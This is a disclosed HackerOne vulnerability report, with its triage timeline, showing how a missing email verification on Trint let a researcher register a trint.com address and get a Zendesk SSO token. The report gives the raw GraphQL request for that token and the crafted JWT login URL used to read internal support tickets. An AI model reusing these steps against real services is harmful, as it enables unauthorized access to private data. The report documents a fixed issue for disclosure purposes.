---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
  - vuln/jwt
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2020-08-24
submitted: 2019-11-11T12:36:00.343Z
bounty_usd: null
votes: 16
cve: []
program: "[[programs/trint|Trint Ltd]]"
reporter: "sopankbegitu"
source: "https://hackerone.com/reports/734936"
title: "SSO bypass in zendesk using trint organization able to leak internal ticket information"
---
# SSO bypass in zendesk using trint organization able to leak internal ticket information

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 16 | **Program:** Trint Ltd | **Disclosed:** 2020-08-24

- Report: [https://hackerone.com/reports/734936](https://hackerone.com/reports/734936)
- CWE: Improper Authentication - Generic
- Submitted: 2019-11-11T12:36:00.343Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

#Summary
hello there because in `app.trint.com` there's no email verification i able to login in your `zendesk SSO` using your organization
your organization using domain `*@trint.com` because there's no email verification i able to read and takeover + claim this email
`support+1@trint.com` and i able to login in zendesk SSO using that email.

#How to reproduce
* i registered in `app.trint.com` using this email `support+1@trint.com` until registration step finish
* i check my burp history there's a `graphql` request in this host `https://graphql2.trint.com/`
* i use this query

```
POST / HTTP/1.1
Host: graphql2.trint.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.trint.com/
content-type: application/json
Authorization: Bearer [REDACTED-JWT]
X-Trint-Request-Id: 4b2f23d5-98a3-4571-a9e1-4218cca76e1b
X-Trint-Super-Properties: {}
Origin: https://app.trint.com
Content-Length: 111
Connection: close

{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n    zendeskToken\n  }\n"}
```

>response header
```
HTTP/1.1 200 OK
Date: Mon, 11 Nov 2019 12:17:06 GMT
Content-Type: application/json
Content-Length: 272
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
Vary: Accept-Encoding

{"data":{"zendeskToken":"[REDACTED-JWT]"}}
```

* i crafted this url `https://trintsupport.zendesk.com/access/jwt?jwt=[REDACTED-JWT]`

* boom logged in in ticket using email `support+1@trint.com`

#POC

{F631462}

## Impact

#Impact
* i can read your ticket organization request through `https://support.trint.com/hc/en-us/requests/organization`

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2019-11-11** @sopankbegitu: here is full poc to reproduce
- **2019-11-12** @nochnoidozor: Hi @oktavandi,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Severity Updated**
- **Report Triaged**
- **2019-11-22** @sopankbegitu: any update?
- **2019-11-27** @fabioantunes: Hi @asdsadas ,

Thank you for reporting this. The issue should now be resolved.
Can you please confirm that you can't reproduce this anymore?

King regards,
@fabioantunes
- **2019-11-27** @sopankbegitu: Yes sir , the issue has been fixed
- **Report Resolved**
- **2019-11-27** @sopankbegitu: Hi there , it seems the points in my reputation of this resolved issue not increased , any info about this?
- **2019-11-28** @fabioantunes: Sorry to hear that. I closed the report as resolved, that should have given you the points and increased the reputation. If it hasn't, then you need to contact someone from HackerOne. 
@nochnoidozor should be able to help you.
- **Agreed On Going Public**
- **Report Became Public**
